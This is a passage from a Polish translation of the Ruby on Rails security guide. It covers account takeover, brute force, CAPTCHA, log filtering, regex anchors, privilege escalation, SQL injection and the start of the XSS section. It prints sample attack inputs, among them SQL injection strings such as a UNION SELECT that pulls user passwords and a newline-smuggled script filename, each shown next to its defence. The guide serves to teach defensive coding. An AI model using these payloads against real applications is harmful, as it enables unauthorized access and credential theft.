<div class="paragraph"><p>Każdy nowy użytkownik otrzymuje kod aktywacyjny, aby aktywować swoje konto.
Link do aktywacji wysyłany jest w mailu. Po aktywacji konta, kolumna
<tt>activation_code</tt> w bazie danych będzie ustawiona na <tt>NULL</tt>. Jeśli ktoś wyśle
żądanie pod taki URL, będzie zalogowany jako pierwszy aktywowany użytkownik, jakiego można znaleźć w bazie danych (i są szanse, że będzie to administrator):</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=</tt></pre>
</div></div>
<div class="paragraph"><p>Jest to możliwe, gdyż na niektórych serwerach parametr <tt>id</tt>, tak jak w
<tt>params[:id]</tt>, miałby wartość <tt>nil</tt>. Natomiast poniżej przedstawiony jest kod
w akcji aktywacji:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>User<span style="color: #990000">.</span>find_by_activation_code<span style="color: #990000">(</span>params<span style="color: #990000">[:</span>id<span style="color: #990000">])</span></tt></pre></div></div>
<div class="paragraph"><p>Jeśli parametr miałby wartość nil, wynikowe zapytanie SQL będzie następujące:</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>SELECT * FROM users WHERE (users.`activation_code` IS NULL) LIMIT 1</tt></pre>
</div></div>
<div class="paragraph"><p>Znaleziony zostanie pierwszy użytkownika w bazie danych i metoda ta spowoduje
jego zalogowanie. Więcej o tym problemie możesz przeczytać na <a href="http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/">moim blogu</a>. <span style="background-color: #fffcdb;">Od czasu do czasu powinieneś aktualizować swoje wtyczki</span>. Ponadto możesz przeglądnąć swoją aplikację, żeby znaleźć więcej takich wad.</p></div>
<h3 id="_ataki_typu_brute_force_na_konta_u_ytkownik_w">7.1. Ataki typu brute-force na konta użytkowników</h3>
<div class="paragraph"><p>-- <em>Ataki typu brute-force na dane logowania użytkowników są robione metodą prób i błędów. Możesz odpierać je stosując bardziej ogólne komunikaty o błędach i ewentualnie wymagać wprowadzania CAPTCHA.</em></p></div>
<div class="paragraph"><p>Lista nazw użytkowników dla aplikacji internetowej może być wykorzystana do
ataku typu brute-force na odpowiadające im hasła, ponieważ większość ludzi nie używa wyszukanych haseł. Większość haseł stanowi połączenie wyrazów ze słownika i ewentualnie numerów. Uzbrojony w listę nazw użytkowników i w słownik, automatyczny program może znaleźć odpowiednie hasło w ciągu kilku minut.</p></div>
<div class="paragraph"><p>Z tego powodu, większość aplikacji internetowych wyświetli ogólny komunikat o błędzie "Błędna nazwa użytkownika lub hasło", jeśli jedna z nich nie jest poprawna. Jeśli komunikat brzmi: "Wpisana nazwa użytkownika nie została znaleziona", atakujący mógłby automatycznie sporządzić listę nazw użytkowników.</p></div>
<div class="paragraph"><p>Jednak tym, co najczęściej zaniedbują projektanci aplikacji internetowych, są
strony do przypominania hasła. Strony te często przyznają, że wpisana nazwa użytkownika lub adres e-mail (nie) została znaleziona. To pozwala atakującemu na skompilowanie listy nazw użytkowników i atak typu brute-force na ich konta.</p></div>
<div class="paragraph"><p>W celu złagodzenia takich ataków, <span style="background-color: #fffcdb;">wyświetlaj ogólne komunikat o
błędzie, również na stronach z zapomnianymi hasłami</span>. Ponadto, możesz
<span style="background-color: #fffcdb;">wymagać, aby wprowadzić CAPTCHA po kilku błędach logowania z
określonego adresu IP</span>. Należy jednak pamiętać, że nie jest to stuprocentowa
ochrona przed automatycznymi programami, ponieważ te programy również mogą
zmieniać adres IP z którego atakują. Co nie zmienia faktu, że utrudnia to
przeprowadzenie ataku.</p></div>
<h3 id="_przej_cie_konta_u_ytkownika">7.2. Przejęcie konta użytkownika</h3>
<div class="paragraph"><p>-- <em>Wiele aplikacji internetowych pozwalają na łatwe przejęcie kont innych użytkowników. Dlaczego by nie zrobić na odwrót i tego nie utrudnić?</em></p></div>
<h4 id="_has_a">7.2.1. Hasła</h4>
<div class="paragraph"><p>Pomyśl o sytuacji, gdy atakujący posiada skradzione cookie sesji użytkownika,
a zatem może wspólnie z użytkownikiem używać aplikacji. Jeżeli zmiana hasła
jest łatwa, atakujący będzie mógł przejąć konto w kilku kliknięciach. Podobnie
jeżeli formularz zmiany hasła jest podatny na atak CSRF, atakujący będzie mógł
zmienić hasło ofiary wabiąc ją do strony internetowej, gdzie jest spreparowany
IMG-tag, który odpala CSRF. Można temu zaradzić i <span style="background-color: #fffcdb;">stworzyć
formularz zmiany hasła odporny na CSRF</span> i <span style="background-color: #fffcdb;">wymagać od użytkownika, aby wprowadzał stare hasło przy jego zmianie</span>.</p></div>
<h4 id="_maile">7.2.2. Maile</h4>
<div class="paragraph"><p>Jednakże, atakujący może również przejąć konto zmieniając adres e-mail. Po
jego zmianie, przejdzie na stronę z zapomnianym hasłem i (prawdopodobnie nowe)
hasło zostanie wysłane na adres e-mail atakującej osoby. Żeby temu zaradzić,
można również <span style="background-color: #fffcdb;">wymagać od użytkownika, aby wprowadził hasło przy zmianie adresu e-mail</span>.</p></div>
<h4 id="_inne">7.2.3. Inne</h4>
<div class="paragraph"><p>W zależności od Twojej aplikacji internetowej, może być więcej sposobów na
przejęcie konta użytkownika. W wielu przypadkach można to zrobić za pomocą XSS
i CSRF. Weźmy na przykład podatność na CSRF w
<a href="http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/">Google
Mail</a>. W zarysie atak ten miał polegać na tym, że ofiara była wabiona do
witryny internetowej kontrolowanej przez atakującego. Na tej stronie był
spreparowany IMG-tag, którego skutkiem było żądanie HTTP GET,  zmieniające ustawienia filtru w Google Mail. Jeżeli ofiara byłaby zalogowana na Google Mail, atakujący zmieniłby filtry i ustawił przekazywanie wszystkich wiadomości e-mail na jego adres e-mail. Jest to prawie tak szkodliwe, jak przejęcie całego konta. Można temu zaradzić <span style="background-color: #fffcdb;">przeglądając logikę aplikacji i eliminując wszystkie luki wrażliwe na XSS i CSRF</span>.</p></div>
<h3 id="_captcha">7.3. CAPTCHA</h3>
<div class="paragraph"><p>-- <em>CAPTCHA jest testem typu challenge-response w celu ustalenia, że odpowiedź
  nie jest generowana przez komputer. Jest często używany do ochrony formularzy
  komentowania przed automatycznymi spam-botami. CAPTCHA prosi użytkownika o wypisanie liter z zniekształconego obrazka. Pomysł negatywnego CAPTCHA nie jest po to by udowadniać, że użytkownik jest człowiekiem, lecz po to, by ujawniać, że robot jest robotem.</em></p></div>
<div class="paragraph"><p>Ale nie tylko spam-boty są problemem. Boty automatycznie logujące również są
problematyczne. Popularnym CAPTCHA API jest <a href="http://recaptcha.net/">reCAPTCHA</a>,
które wyświetla dwa zniekształcone obrazy zawierające słowa ze starych
książek. ReCAPTCHA dodaje również ukośne linie, zamiast zniekształcania tła
oraz kształtu tekstu jak to było w przypadku wcześniejszych CAPTCHA, które
zostały złamane. Ponadto używanie reCAPTCHA pomaga w tworzeniu cyfrowych wersji starych książek. <a href="http://ambethia.com/recaptcha/">ReCAPTCHA</a> jest także Railsową wtyczką, o takiej samej nazwie jak API.</p></div>
<div class="paragraph"><p>Po zarejestrowaniu w reCAPTCHA trzymasz dwa klucze od API, publiczny i
prywatny, które trzeba umieścić w swoim środowisku Railsowym. Potem możesz
użyć metody <tt>recaptcha_tags</tt> w widoku i metody <tt>verify_recaptcha</tt> w
kontrolerze. <tt>verify_recaptcha</tt> zwróci <tt>false</tt>, jeżeli walidacja zawiedzie.
Problem z CAPTCHA jest taki, że są irytująca. Ponadto, niektórzy niedowidzący użytkownicy uznali, że niektóre rodzaje zniekształcenia CAPTCHA są trudne do odczytania. Pomysł negatywnego CAPTCHA nie jest po to by udowadniać, że użytkownik jest człowiekiem, lecz po to, by ujawniać, że robot jest robotem.</p></div>
<div class="paragraph"><p>Większość botów jest naprawdę głupia – przeszukują sieć i umieszczają spam w
każdym znalezionym polu formularza. Negatywne CAPTCHA wykorzystują to i
umieszczają pole "lep na muchy" w formularzu, które będzie ukryte przed człowiekiem przez CSS lub JavaScript.</p></div>
<div class="paragraph"><p>Oto kilka pomysłów, jak ukryć pola "lep na muchy" przez JavaScript i/lub CSS:</p></div>
<div class="ulist"><ul>
<li>
<p>
Umieszczenie pola poza widocznym obszarem strony
</p>
</li>
<li>
<p>
Stworzenie bardzo małych elementów lub w tym samym kolorze, co tło strony
</p>
</li>
<li>
<p>
Zostaw pola widoczne, ale poinformuj ludzi, żeby pozostawili je puste
</p>
</li>
</ul></div>
<div class="paragraph"><p>Najprostsze negatywne CAPTCHA to te, ukryte w polach "lep na muchy". Po
stronie serwera, sprawdzana jest wartość tego pola: jeśli zawiera tekst, to musi być bot. Następnie można zignorować dodany post, lub zwrócić pozytywny wynik, ale nie zapisywać posta w bazie danych. W ten sposób bot będzie zadowolony i przejdzie dalej. Można to również zrobić z irytującymi użytkownikami.</p></div>
<div class="paragraph"><p>Bardziej wyrafinowane negatywne CAPTCHA możesz znaleźć na <a href="http://nedbatchelder.com/text/stopbots.html">blogu Batchelder Ned’a</a>:</p></div>
<div class="ulist"><ul>
<li>
<p>
Dołącz pole z aktualnym znacznikiem czasowym UTC i sprawdź go na serwerze. Jeżeli jest on zbyt daleko w przeszłości lub w przyszłości, formularz jest nieprawidłowy.
</p>
</li>
<li>
<p>
Nazwy pól dobieraj losowo
</p>
</li>
<li>
<p>
Umieszczaj więcej niż jedno pole "lep na muchy" różnego typu, uwzględniając
  również przyciski akceptacji formularza.
</p>
</li>
</ul></div>
<div class="paragraph"><p>Zauważ, że to chroni Cię jedynie przed automatycznymi botami, specjalnie
wykonane roboty nie mogą być w ten sposób zatrzymane. Więc negatywna CAPTCHA
może nie okazać się najlepszym sposobem chronienia formularzy logowania.</p></div>
<h3 id="_logowanie">7.4. Logowanie</h3>
<div class="paragraph"><p>-- <em>Postaraj się, żeby Railsy nie wpisywały haseł w pliku logu.</em></p></div>
<div class="paragraph"><p>Domyślnie Railsy rejestrują w logu wszystkie żądania wysyłane do strony
internetowej. Ale logi mogą stanowić ogromny problem związany z
zabezpieczeniami, ponieważ mogą one zawierać dane logowania, numery kart
kredytowych itp. Podczas projektowania bezpieczeństwa aplikacji internetowej
należy pomyśleć o tym, co się stanie, gdy atakujący będzie miał (pełny) dostęp
do serwera WWW. Szyfrowanie informacji tajnych i haseł w bazie danych okaże
się bezużyteczne, jeżeli w logu pojawią się jako zwykły tekst. Możesz
<span style="background-color: #fffcdb;">filtrować niektóre parametry żądań z logu</span> dzięki metodzie
kontrolera <tt>filter_parameter_logging</tt>. Parametry te będą w logu oznaczone
jako <tt>[FILTERED]</tt>.</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>filter_parameter_logging <span style="color: #990000">:</span>password</tt></pre></div></div>
<h3 id="_dobre_has_a">7.5. Dobre hasła</h3>
<div class="paragraph"><p>-- <em>Czy ciężko Ci zapamiętać wszystkie hasła? Nie zapisuj ich, lecz korzystaj z pierwszych liter wyrazów w łatwym do zapamiętania zdaniu.</em></p></div>
<div class="paragraph"><p>Bruce Schneier, technolog zabezpieczeń, <a href="http://www.schneier.com/blog/archives/2006/12/realworld_passw.html">przeanalizował</a> 34000 występujących w świecie rzeczywistym nazw użytkowników i haseł ze wspomnianej wcześniej próby wyłudzenia danych z MySpace. Okazuje się, że większość haseł jest dość łatwa do złamania. Oto 20 najpopularniejszych haseł:</p></div>
<div class="paragraph"><p>password1, abc123, myspace1, password, blink182, qwerty1, <strong>*</strong>*you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1 and monkey.</p></div>
<div class="paragraph"><p>Interesujący jest fakt, że tylko 4% tych haseł to słownikowe wyrazy i większość to hasła alfanumeryczne. Jednak słowniki crackerów zawierają wiele dzisiejszych haseł i próbują wszystkich (alfanumerycznych) kombinacji. Jeśli atakujący zna nazwę użytkownika, który używa słabego hasła, w łatwy sposób można dokonać włamania.</p></div>
<div class="paragraph"><p>Dobrym hasłem jest długa mieszanka alfanumerycznych kombinacji różnego
rodziaju. Ponieważ jest to dość trudne do zapamiętania, jest wskazane, aby
zapisać tylko <span style="background-color: #fffcdb;">pierwsze litery zdania, która można łatwo
zapamiętać</span>. Na przykład "The quick brown fox jumps over the lazy dog" będzie
"Tqbfjotld". Zauważ, że jest to tylko przykład, nie należy używać znanego wyrażenia, które może pojawić się w słowniki crackera.</p></div>
<h3 id="_wyra_enia_regularne">7.6. Wyrażenia regularne</h3>
<div class="paragraph"><p>-- <em>Powszechną pułapką w wyrażeniach regularnych w Ruby jest dopasowanie ciągu na początku i na końcu przez ^ i $, zamiast \A i \z.</em></p></div>
<div class="paragraph"><p>Ruby używa nieco innego podejścia niż w wielu innych językach, aby dopasować koniec i początek ciągu znaków. Dlatego nawet w książkach o Ruby i Railsach popełnia się błędy. W jaki sposób może to zagrażać bezpieczeństwu? Wyobraź sobie, że masz model pliku i walidujesz nazwę pliku przez wyrażenie regularne w taki sposób:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">class</span></span> File <span style="color: #990000">&lt;</span> ActiveRecord<span style="color: #990000">::</span>Base
  validates_format_of <span style="color: #990000">:</span>name<span style="color: #990000">,</span> <span style="color: #990000">:</span>with <span style="color: #990000">=&gt;</span> <span style="color: #FF6600">/^[\w\.\-\+]+$/</span>
<span style="font-weight: bold"><span style="color: #0000FF">end</span></span></tt></pre></div></div>
<div class="paragraph"><p>Oznacza to, że model potwierdzi nazwę pliku składającą się tylko ze znaków
alfanumerycznych, kropek, + i -. I programista dodaje ^ i $ po to by
zagwarantować, że nazwa pliku będzie zawierać wyłącznie te znaki w całym
łańcuchu. Jednakże <span style="background-color: #fffcdb;">w Ruby ^ i $ odpowiada początkowi i końcu
<strong>linii</strong></span>. A więc taka nazwa pliku przechodzi przez filtr bez problemów:</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>file.txt%0A&lt;script&gt;alert('hello')&lt;/script&gt;</tt></pre>
</div></div>
<div class="paragraph"><p><tt>%0A</tt> oznacza znak końca linii w kodowaniu URL i Railsy automatycznie
konwertują ten tekst na <tt>file.txt\n&lt;script&gt;alert(‘Hello’)&lt;/script&gt;</tt>. Ta nazwa
pliku przechodzi przez filtr, gdyż wyrażenie regularne dopasowywane jest do końca linii,
reszta nie ma znaczenia. Prawidłowe wyprażenie powinno wyglądać następująco:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="color: #FF6600">/\A[\w\.\-\+]+\z/</span></tt></pre></div></div>
<h3 id="_eskalacja_przywilej_w">7.7. Eskalacja przywilejów</h3>
<div class="paragraph"><p>-- <em>Zmiana pojedynczego parametru może dać użytkownikowi nieautoryzowany
dostęp. Pamiętaj, że każdy parametr może ulec zmianie, bez względu na to jak
bardzo go ukrywasz lub zaciemniasz.</em></p></div>
<div class="paragraph"><p>Najpopularniejszym parametrem, który użytkownik może modyfikować, jest
parametr <tt>id</tt>, jak w <tt>http://www.domain.com/project/1</tt>, gdziet 1 jest
identyfikatorem. Jest on dostępny w <tt>params[:id]</tt> w kontrolerze.
Najprawdopodobniej wykorzystasz go w taki sposób:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="color: #009900">@project</span> <span style="color: #990000">=</span> Project<span style="color: #990000">.</span>find<span style="color: #990000">(</span>params<span style="color: #990000">[:</span>id<span style="color: #990000">])</span></tt></pre></div></div>
<div class="paragraph"><p>Jest to w porządku dla niektórych aplikacji internetowych, ale z pewnością nie
w przypadku, gdy użytkownik nie ma uprawnień, aby zobaczyć wszystkie projekty.
Jeśli użytkownik zmienia <tt>id</tt> na 42 i nie jest uprawniony do przeglądania tej
informacji, to i tak będzie miał do nich dostęp. Zamiast tego
<span style="background-color: #fffcdb;">sprawdzaj również prawa dostępu użytkownika</span>:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="color: #009900">@project</span> <span style="color: #990000">=</span> <span style="color: #009900">@current_user</span><span style="color: #990000">.</span>projects<span style="color: #990000">.</span>find<span style="color: #990000">(</span>params<span style="color: #990000">[:</span>id<span style="color: #990000">])</span></tt></pre></div></div>
<div class="paragraph"><p>W zależności od twojej aplikacji internetowej, może być o wiele więcej
parametrów, które użytkownik może modyfikować. Przyjmij zasadę, że
<span style="background-color: #fffcdb;">żadne dane wprowadzane przez użytkownika nie są bezpieczne, dopóki nie zostanie udowodnione, że jest inaczej. Użytkownik może manipulować każdym parametrem</span>.</p></div>
<div class="paragraph"><p>Nie daj się nabrać na bezpieczeństwo przez zaciemnienie (security by
obfuscations) i bezpieczeństwo JavaScript. Zestaw narzędzi programisty (Web
Developer Toolbar) dla przeglądarki Mozilla Firefox pozwala przejrzeć i
zmienić każde ukryte pole formularza. <span style="background-color: #fffcdb;">JavaScript może być
wykorzystywany w celu weryfikacji danych użytkownika, ale z pewnością nie po
to, by zapobiec wysyłaniu złośliwych żądań z nieoczekiwanymi wartościami</span>.
Wtyczka Live Http Headers do przeglądarki Mozilla Firefox rejestruje każde
żądanie, może je powtarzać i zmieniać. Jest to prosty sposób na ominięcie wszelkich walidacji przez JavaScript. Są też nawet proxy po stronie klienta, które pozwalają na przechwytywanie wszelkich żądań i odpowiedzi z i do Internetu.</p></div>
</div>
<h2 id="_atak_typu_injection">8. Atak typu Injection</h2>
<div class="sectionbody">
<div class="paragraph"><p>-- <em>Klasa ataków typu injection polega na wprowadzeniu złośliwego kodu lub
parametrów do aplikacji internetowej w celu uruchomienia go w kontekście jej
bezpieczeństwa. Typowym przykład ataku typu injection jest atak cross-site scripting (XSS) i atak typu SQL injection.</em></p></div>
<div class="paragraph"><p>Atak typu injection jest bardzo podstępny, ponieważ ten sam kod lub parametr
może być złośliwy w jednym kontekście, ale całkowicie nieszkodliwy w innym.
Kontekstem może być skrypt, zapytania lub język programowania, powłoka (Shell)
lub metoda w Ruby/Rails. Poniższe sekcje będą obejmować wszystkie ważne
konteksty gdzie mogą wystąpić ataki typu injection. Pierwsza część obejmuje
architektoniczne decyzje związane z atakiem typu injection.</p></div>
<h3 id="_bia_e_listy_vs_czarne_listy">8.1. Białe listy vs Czarne listy</h3>
<div class="paragraph"><p>-- <em>Przy czyszczeniu, ochronie lub sprawdzeniu czegoś, białe listy wygrywają z czarnymi.</em></p></div>
<div class="paragraph"><p>Czarna lista może być zbiorem złych adresów e-mail, akcji, które nie są
publiczne lub złych tagów HTML. Jest przeciwieństwem białej listy, która
zawiera dobre adresy e-mail, publiczne akcje, dobre znaczniki HTML i tak
dalej. Chociaż czasami nie jest możliwe stworzenie białej listy (na przykład
filtr antyspamowy), <span style="background-color: #fffcdb;">lepiej jest używać właśnie jej</span>:</p></div>
<div class="ulist"><ul>
<li>
<p>
Korzystaj z <tt>before_filter :only =&gt; [...]</tt> zamiast <tt>expect =&gt; [...]</tt>.
  W ten sposób nie zapomnisz go wyłączyć dla świeżo dodanych akcji.
</p>
</li>
<li>
<p>
Korzystaj z <tt>attr_accessible</tt> zamiast <tt>attr_protected</tt>. Szczegóły znajdziesz w sekcji o masowym przypisaniu.
</p>
</li>
<li>
<p>
Zezwól na <tt>&lt;strong&gt;</tt> zamiast usuwania <tt>&lt;script&gt;</tt> przeciwko Cross-Site Scripting (XSS). Zobacz poniżej.
</p>
</li>
<li>
<p>
Nie próbuj poprawiać wejścia użytkownika przez czarne listy:
</p>
<div class="ulist"><ul>
<li>
<p>
W ten sposób atak będzie działał tak: <tt>"&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")</tt>
</p>
</li>
<li>
<p>
Po prostu odrzucaj nieprawidłowe dane wejściowe
</p>
</li>
</ul></div>
</li>
</ul></div>
<div class="paragraph"><p>Białe listy są również dobre w przypadku gdy ludzie zapominają pewnych rzeczy umieścić na czarnych listach.</p></div>
<h3 id="_atak_typu_sql_injection">8.2. Atak typu SQL Injection</h3>
<div class="paragraph"><p>-- <em>Dzięki zmyślnym metodom, ten problem zniknął już w większości aplikacji Railsowych. Jest to jednak bardzo niszczycielski i powszechny atak na aplikacje internetowe, więc ważne jest, aby zrozumieć problem.</em></p></div>
<h4 id="_wst_p_2">8.2.1. Wstęp</h4>
<div class="paragraph"><p>Atak typu SQL injection ma na celu wpływanie na zapytania do bazy danych
poprzez manipulowanie parametrami aplikacji internetowej. Popularnym celem
ataków typu SQL injection jest ominięcie autoryzacji. Kolejnym celem jest
manipulacja danymi lub odczyt dowolnych danych. Oto przykład, jak <strong>nie używać</strong>
danych wprowadzonych przez użytkownika w zapytaniu:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>Project<span style="color: #990000">.</span>find<span style="color: #990000">(:</span>all<span style="color: #990000">,</span> <span style="color: #990000">:</span>conditions <span style="color: #990000">=&gt;</span> <span style="color: #FF0000">"name = '#{params[:name]}'"</span><span style="color: #990000">)</span></tt></pre></div></div>
<div class="paragraph"><p>Może to być w akcji wyszukiwania i użytkownik może wpisać nazwę projektu, który chce znaleźć. Jeśli złośliwy użytkownik wpisze <em> OR 1=1</em>, wynikiem zapytania SQL będzie:</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>SELECT * FROM projects WHERE name = '' OR 1 --'</tt></pre>
</div></div>
<div class="paragraph"><p>Dwie kreski rozpoczynają komentarz ignorując wszystko po nim. Zatem zapytanie zwraca wszystkie rekordy z tabeli projekty, w tym te niewidoczne dla użytkownika. Dzieje się tak, ponieważ warunek jest prawdziwy dla wszystkich rekordów.</p></div>
<h4 id="_pomini_cie_autoryzacji">8.2.2. Pominięcie autoryzacji</h4>
<div class="paragraph"><p>Zwykle aplikacja internetowa zawiera kontrolę dostępu. Użytkownik wprowadza jego dane logowania, a aplikacja próbuje znaleźć pasujący rekord w tabeli użytkowników. Aplikacja zapewnia dostęp, jeżeli znajdzie rekord. Jednakże, osoba atakująca może ewentualnie pominąć ten krok poprzez atak SQL injection. Poniżej pokazane jest typowe zapytanie do bazy danych w Railsach w celu znalezienia pierwszego rekordu w tabeli użytkowników, który pasuje do parametrów logowania dostarczonych przez użytkownika.</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>User<span style="color: #990000">.</span>find<span style="color: #990000">(:</span>first<span style="color: #990000">,</span> <span style="color: #FF0000">"login = '#{params[:name]}' AND password = '#{params[:password]}'"</span><span style="color: #990000">)</span></tt></pre></div></div>
<div class="paragraph"><p>Jeżeli atakujący wprowadzi <tt>'' OR 1=1</tt> jako imię i <tt>'' OR 2&gt;1</tt> jako hasło, rezultat zapytania SQL będzie następujący:</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>SELECT * FROM users WHERE login = '' OR 1=1 AND password = '' OR 2&gt;1 LIMIT 1</tt></pre>
</div></div>
<div class="paragraph"><p>To po prostu znajdzie pierwszego użytkownika w bazie danych i zapewni mu dostęp do aplikacji.</p></div>
<h4 id="_nieautoryzowane_czytanie">8.2.3. Nieautoryzowane czytanie</h4>
<div class="paragraph"><p>Klauzula <tt>UNION</tt> łączy dwa zapytania SQL i zwraca dane w jednym zestawie.
Atakujący może jej użyć do odczytu arbitralnych danych z bazy. Weźmy
wcześniejszy przykład:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>Project<span style="color: #990000">.</span>find<span style="color: #990000">(:</span>all<span style="color: #990000">,</span> <span style="color: #990000">:</span>conditions <span style="color: #990000">=&gt;</span> <span style="color: #FF0000">"name = '#{params[:name]}'"</span><span style="color: #990000">)</span></tt></pre></div></div>
<div class="paragraph"><p>A teraz wprowadźmy inne zapytanie używając <tt>UNION</tt>:</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --</tt></pre>
</div></div>
<div class="paragraph"><p>W rezultacie otrzymamy następujące zapytanie SQL:</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --')</tt></pre>
</div></div>
<div class="paragraph"><p>Rezultatem nie będzie lista projektów (ponieważ nie ma projektu z pustym polem nazwy), tylko lista nazw użytkowników i ich hasła. Miejmy nadzieję, że zaszyfrowałeś hasła w bazie danych! Jedynym problemem dla atakującego jest to, że liczba kolumn musi być taka sama w obu zapytaniach. Dlatego drugie zapytanie zawiera listę jedynek (1), która zawsze będzie mieć wartość 1, w celu dopasowania liczby kolumn w pierwszym zapytaniu.</p></div>
<div class="paragraph"><p>Również drugie zapytanie zmienia nazwy niektórych kolumn korzystając z <tt>AS</tt> tak aby aplikacja internetowa wyświetlała wartości z tabeli użytkowników. Pamiętaj, aby zaktualizować Railsy <a href="http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/">przynajmniej do wersji 2.1.1</a>.</p></div>
<h4 id="_sposoby_ochrony_2">8.2.4. Sposoby ochrony</h4>
<div class="paragraph"><p>Ruby on Rails jest wyposażone w specjalny filtr dla znaków SQL, do których
należą znaki cytowania ' , " , napis <tt>NULL</tt> i podział wiersza.
<span style="background-color: #fffcdb;">Korzystając z <tt>Model.find(id)</tt> lub
<tt>Model.find_by_something(something)</tt> automatycznie stosujesz ochronę</span>. Ale
fragmenty SQL, szczególnie <span style="background-color: #fffcdb;">w warunkach (<tt>:conditions =&gt;
"..."</tt>), metody <tt>connection.execute()</tt> lub <tt>Model.find_by_sql()</tt> muszą być
zabezpieczone ręcznie</span>.</p></div>
<div class="paragraph"><p>Zamiast przekazywać łańcuch znaków do opcji <tt>conditions</tt>, możesz przekazać
tablicę aby oczyścić zanieczyszczone łańcuchy w następujący sposób:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>Model<span style="color: #990000">.</span>find<span style="color: #990000">(:</span>first<span style="color: #990000">,</span> <span style="color: #990000">:</span>conditions <span style="color: #990000">=&gt;</span> <span style="color: #990000">[</span><span style="color: #FF0000">"login = ? AND password = ?"</span><span style="color: #990000">,</span> entered_user_name<span style="color: #990000">,</span> entered_password<span style="color: #990000">])</span></tt></pre></div></div>
<div class="paragraph"><p>Jak widać, pierwsza część tablicy jest fragmentem SQL ze znakami zapytania. W
oczyszczonej wersji zmienne w drugiej części tablicy zastąpiły znaki
zapytania. To samo można zrobić z tablicą asocjacyjną:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>Model<span style="color: #990000">.</span>find<span style="color: #990000">(:</span>first<span style="color: #990000">,</span> <span style="color: #990000">:</span>conditions <span style="color: #990000">=&gt;</span> <span style="color: #FF0000">{</span><span style="color: #990000">:</span>login <span style="color: #990000">=&gt;</span> entered_user_name<span style="color: #990000">,</span> <span style="color: #990000">:</span>password <span style="color: #990000">=&gt;</span> entered_password<span style="color: #FF0000">}</span><span style="color: #990000">)</span></tt></pre></div></div>
<div class="paragraph"><p>Ta metoda wykorzystująca tablicę zwykłą lub asocjacyjną jest dostępny tylko
dla instancji modelu. W innych miejscach możesz spróbować <tt>sanitize_sql()</tt>.
<span style="background-color: #fffcdb;">Nabierz nawyku myślenia o konsekwencjach bezpieczeństwa gdy
korzystasz z zewnętrznego ciągu znaków w zapytaniach SQL</span>.</p></div>
<h3 id="_atak_cross_site_scripting_xss">8.3. Atak Cross-Site Scripting (XSS)</h3>
<div class="paragraph"><p>-- <em>Najbardziej rozpowszechnionym i zarazem jednym z najbardziej niszczycielski dla aplikacji internetowych jest atak typu XSS. Ten złośliwy atak wprowadza wykonywalny kod po stronie klienta. Railsy dostarczają helpery, żeby się przed nim bronić.</em></p></div>
<h4 id="_punkty_wej_cia">8.3.1. Punkty wejścia</h4>
<div class="paragraph"><p>Punktem wejścia jest podatny adres URL i jego parametry, od których
można rozpocząć atak.</p></div>
<div class="paragraph"><p>Najczęstszymi punktami wejścia są posty, komentarze użytkowników i księgi
gości, ale tytuły projektów, nazwy dokumentów i strony z wynikami wyszukiwania
również są narażone - niemal wszystkie miejsca, w których użytkownik może
wprowadzać dane. Jednakże dane wejściowe nie muszą pochodzić z formularzy na
stronach internetowych. Może być to jakikolwiek parametr URL - nawet ukryty
lub wewnętrzny. Pamiętaj, że użytkownik może przechwycić wszelki ruch z i do
aplikacji. Aplikacje takie jak <a href="http://livehttpheaders.mozdev.org/">wtyczka Live
HTTP Headers dla Firefox&#8217;a</a> lub Proxy po stronie klienta ułatwiają modyfikację żądania.</p></div>
<div class="paragraph"><p>Ataki XSS działają w taki sposób: atakujący wprowadza jakiś kod, aplikacja
internetowa zapisuje go i wyświetla na stronie, a później przedstawia ofierze.
